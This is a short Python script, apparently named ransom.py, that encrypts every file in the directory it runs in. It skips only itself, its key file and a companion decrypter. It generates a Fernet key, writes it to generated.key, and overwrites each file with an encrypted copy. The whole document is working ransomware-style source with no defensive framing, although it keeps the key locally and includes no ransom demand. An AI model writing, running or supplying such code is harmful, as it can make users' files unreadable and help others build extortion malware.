import os
from cryptography.fernet import Fernet

file_list = []

for file in os.listdir():
    if file == "ransom.py" or file == "generated.key" or file == "ransom_decrypter.py":
        continue
    if os.path.isfile(file): #only files
        file_list.append(file)

print(file_list)

key = Fernet.generate_key()
print(key)

with open("generated.key", "wb") as generated_key:
    generated_key.write(key)

for file in file_list:
    with open(file, "rb") as read_file:
        contents = read_file.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as write_file:
        write_file.write(contents_encrypted)
